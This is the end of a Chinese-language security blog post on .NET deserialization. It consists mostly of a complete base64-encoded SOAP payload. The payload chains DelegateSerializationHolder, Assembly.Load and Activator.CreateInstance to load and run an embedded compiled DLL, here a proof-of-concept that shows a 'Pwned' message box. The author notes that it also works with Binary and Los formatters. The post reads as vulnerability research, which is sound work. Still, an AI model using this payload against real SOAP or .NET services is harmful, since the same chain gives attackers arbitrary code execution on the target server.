class="line">vbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQgIAgoAAAAAAAAAAAoBIQAAABwAAAAJNQAAAAk2AAAAASUAAAAcAAAACTcAAAAJOAAAAAErAAAAAwAAAAk5AAAACToAAAAHMg</span><br><span class="line">AAAAEBAAAABAAAAAcCCTsAAAAKCgoEMwAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZ</span><br><span class="line">QptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQY8AAAA1QFTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uQnl0ZVtdLCBtc2NvcmxpYiwgVmVyc2lv</span><br><span class="line">bj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCB</span><br><span class="line">QdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JLgAAAAoJLgAAAAY+AAAAGlN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5Bj8AAAAETG9hZAoENAAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbk</span><br><span class="line">hvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JPwAAAAkuAAAACT4AAAAGQgAAACdTeXN0Z</span><br><span class="line">W0uUmVmbGVjdGlvbi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkGQwAAAC5TeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSBMb2FkKFN5c3RlbS5CeXRlW10pCAAAAAoBNQAAADMAAAAGRAAAAMwCU3lzdGVtLkZ1bmNgMltbU3lzdGVtLlJlZmxl</span><br><span class="line">Y3Rpb24uQXNzZW1ibHksIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhYmxlYDF</span><br><span class="line">bW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cm</span><br><span class="line">FsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JLgAAAAoJLgAAAAk+AAAABkcAAAAIR2V0VHlwZXMKATYAAAA0AAAACUcAAAAJLgAAAAk+AAAABkoAAAAYU3lzdGVtLlR5cGVbXSBHZXRUeXBlcygpBksAAAAYU3lzdGVtL</span><br><span class="line">lR5cGVbXSBHZXRUeXBlcygpCAAAAAoBNwAAADMAAAAGTAAAAMYBU3lzdGVtLkZ1bmNgMltbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYx</span><br><span class="line">OTM0ZTA4OV0sW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCS4AAAAKCS4AAAAGTgAAABBTeXN0ZW0uQWN0aXZhdG9</span><br><span class="line">yBk8AAAAOQ3JlYXRlSW5zdGFuY2UKATgAAAA0AAAACU8AAAAJLgAAAAlOAAAABlIAAAApU3lzdGVtLk9iamVjdCBDcmVhdGVJbnN0YW5jZShTeXN0ZW0uVHlwZSkGUwAAAClTeXN0ZW0uT2JqZWN0IENyZWF0ZUluc3RhbmNlKFN5c3RlbS</span><br><span class="line">5UeXBlKQgAAAAKATkAAAALAAAABlQAAAAmU3lzdGVtLkNvbXBvbmVudE1vZGVsLkRlc2lnbi5Db21tYW5kSUQEAAAACSoAAAAQOgAAAAIAAAAJVgAAAAgIACAAAA87AAAAABIAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dyYW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMARnHPZQAAAAAAAAAA4AAiIAsBMAAACgAAAAYAAAAA</span><br><span class="line">AAAuKAAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAYAAAAAAAAAAIAAAAACAAAAAAAAAwBghQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAA3CcAAE8AAAAAQAAAeAMAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAKQmAAA</span><br><span class="line">cAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAAAAAALnRleHQAAAA0CAAAACAAAAAKAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAAeAMAAABAAAAABA</span><br><span class="line">AAAAwAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAQAAAAAAAAAAAAAAAAAABAAABCAAAAAAAAAAAAAAAAAAAAABAoAAAAAAAASAAAAAIABQB4IAAALAYAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcgIoDwAACgAAcgEAAHByAQAAcBYfECgQAAAKJioiAHMBAAAGJioAAEJTSkIBAAEAAAAAAAwAAAB2NC4wLjMwMzE5AAAAAAUAbAAAAPABAAAjfgAAXAIAAJgCAAAjU3RyaW5ncwAAAAD0BAAAEAAA</span><br><span class="line">ACNVUwAEBQAAEAAAACNHVUlEAAAAFAUAABgBAAAjQmxvYgAAAAAAAAACAAABRxUAAAkAAAAA+gEzABYAAAEAAAAUAAAAAgAAAAIAAAABAAAAEAAAAA4AAAABAAAAAgAAAAAAnAEBAAAAAAAGAPcADwIGAGQBDwIGACsA3QEPAC8CAAAGAFM</span><br><span class="line">AxQEGANoAxQEGALsAxQEGAEsBxQEGABcBxQEGADABxQEGAGoAxQEGAD8A8AEGAB0A8AEGAJ4AxQEGAIUAggEGAHMCqgEKAIwCQwIKAHoCQwIKAFgCQwIKALYBQwIAAAAAAQAAAAAAAQABAAEAEABqAgAAQQABAAEAUCAAAAAAhhjXAQYAAQ</span><br><span class="line">BtIAAAAACWALEBLgABAAAAAQA+AgkA1wEBABEA1wEGABkA1wEKACkA1wEQADEA1wEQADkA1wEQAEEA1wEQAEkA1wEQAFEA1wEQAFkA1wEQAGEA1wEVAGkA1wEQAHEA1wEQAHkA1wEQAIEA1wEGAIkAhwIaAC4ACwA0AC4AEwA9AC4AGwBcA</span><br><span class="line">C4AIwBlAC4AKwB0AC4AMwB0AC4AOwB0AC4AQwBlAC4ASwB6AC4AUwB0AC4AWwB0AC4AYwCSAC4AawC8AC4AcwDJAASAAAABAAAAAAAAAAAAAAAAAAoAAAAEAAAAAAAAAAAAAAAlABQAAAAAAAQAAAAAAAAAAAAAACUAQwIAAAAAAAAAPE1v</span><br><span class="line">ZHVsZT4ARXhwQ2xhc3NhAG1zY29ybGliAEd1aWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBDb21WaXNpYmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAVGFyZ2V</span><br><span class="line">0RnJhbWV3b3JrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dH</span><br><span class="line">JpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAFN5c3RlbS5SdW50aW1lLlZlcnNpb</span><br><span class="line">25pbmcARXhwQ2xhc3NhLmRsbABTeXN0ZW0ATWFpbgBNZXNzYWdlQm94SWNvbgBTeXN0ZW0uUmVmbGVjdGlvbgAuY3RvcgBTeXN0ZW0uRGlhZ25vc3RpY3MAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAFN5c3RlbS5SdW50aW1l</span><br><span class="line">LkNvbXBpbGVyU2VydmljZXMARGVidWdnaW5nTW9kZXMAYXJncwBTeXN0ZW0uV2luZG93cy5Gb3JtcwBNZXNzYWdlQm94QnV0dG9ucwBFeHBDbGFzcwBPYmplY3QARGlhbG9nUmVzdWx0AFNob3cATWVzc2FnZUJveAAAAAtQAHcAbgBlAGQ</span><br><span class="line">AAAAAAK00MrKVZahFsxPKH8HhthQABCABAQgDIAABBSABARERBCABAQ4EIAEBAgoABBFJDg4RTRFRCLd6XFYZNOCJBQABAR0OCAEACAAAAAAAHgEAAQBUAhZXcmFwTm9uRXhjZXB0aW9uVGhyb3dzAQgBAAcBAAAAAA4BAAlFeHBDbGFzc2</span><br><span class="line">EAAAUBAAAAABcBABJDb3B5cmlnaHQgwqkgIDIwMjQAACkBACRBQzhERjFBRi03MjBELTRCRTctQUU0MC05MEQzRjU3RDhBQjAAAAwBAAcxLjAuMC4wAABNAQAcLk5FVEZyYW1ld29yayxWZXJzaW9uPXY0LjUuMgEAVA4URnJhbWV3b3JrR</span><br><span class="line">GlzcGxheU5hbWUULk5FVCBGcmFtZXdvcmsgNC41LjIAAAAAAEZxz2UAAAAAAgAAABwBAADAJgAAwAgAAFJTRFMEtmaoGwdvTKnj5k/WPUylAQAAAEU6XENURkxlYXJuaW5nXOW8gOWPkeWtpuS5oFxDc2hhcnBMZWFybmluZ1xFeHBDbGFz</span><br><span class="line">c2FcRXhwQ2xhc3NhXG9ialxEZWJ1Z1xFeHBDbGFzc2EucGRiAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCgAAAAAAAAAAAAAHigAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAoAAAAAAAAAAAAAAAAX0Nvck</span><br><span class="line">RsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAAAAEAAQAAADAAAI</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYQAAAHAMAAAAAAAAAAAAAHAM0AAAAVgBTAF8AVgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAABAAAAAAAAAAEAAAAAAD8AAAAAAAAABAAAAAIAAAAAAAAAAAAAAAAAAABEA</span><br><span class="line">AAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAAACQABAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBHwCAAABAFMAdAByAGkAbgBnAEYAaQBsAGUASQBuAGYAbwAAAFgCAAABADAAMAAwADAAMAA0AGIAMAAAABoAAQABAEMA</span><br><span class="line">bwBtAG0AZQBuAHQAcwAAAAAAAAAiAAEAAQBDAG8AbQBwAGEAbgB5AE4AYQBtAGUAAAAAAAAAAAA8AAoAAQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAARQB4AHAAQwBsAGEAcwBzAGEAAAAwAAgAAQBGAGkAbABlAFYAZQB</span><br><span class="line">yAHMAaQBvAG4AAAAAADEALgAwAC4AMAAuADAAAAA8AA4AAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAEUAeABwAEMAbABhAHMAcwBhAC4AZABsAGwAAABIABIAAQBMAGUAZwBhAGwAQwBvAHAAeQByAGkAZwBoAHQAAABDAG8AcAB5AH</span><br><span class="line">IAaQBnAGgAdAAgAKkAIAAgADIAMAAyADQAAAAqAAEAAQBMAGUAZwBhAGwAVAByAGEAZABlAG0AYQByAGsAcwAAAAAAAAAAAEQADgABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABFAHgAcABDAGwAYQBzAHMAYQAuAGQAb</span><br><span class="line">ABsAAAANAAKAAEAUAByAG8AZAB1AGMAdABOAGEAbQBlAAAAAABFAHgAcABDAGwAYQBzAHMAYQAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABW</span><br><span class="line">AGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAwAAAAwOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAEVgAAAAtTeXN0ZW0uR3VpZAsAAAACX2ECX2ICX2MCX2QCX2UCX2YCX2cCX2gCX2kCX2oCX2sAAAAAAAAAAAAAAAgHBwICAgICAgICExPSdO4q0RGL+wCgyQ8m9ws=<span class="tag">&lt;/<span class="name">SOAP-ENC:Array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">SOAP-ENV:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">SOAP-ENV:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>最终soap的payload如上。换成Binary或者Los都是一样可以触发的。</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/反序列化/" class="tag">#反序列化</a><a href="/tags/NET/" class="tag">#.NET</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2024/02/29/Atlassian%20Confluence%20CVE-2023-22527%20%E5%88%86%E6%9E%90%E5%8F%8A%E6%AD%A6%E5%99%A8%E5%8C%96%E5%AE%9E%E7%8E%B0/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">Atlassian Confluence CVE-2023-22527 分析及武器化实现</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2024/02/12/%E6%98%93%E6%87%82%E7%9A%84Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%88%E6%9B%B4%E6%96%B0%EF%BC%89/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">易懂的Rome反序列化利用链(updated)</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>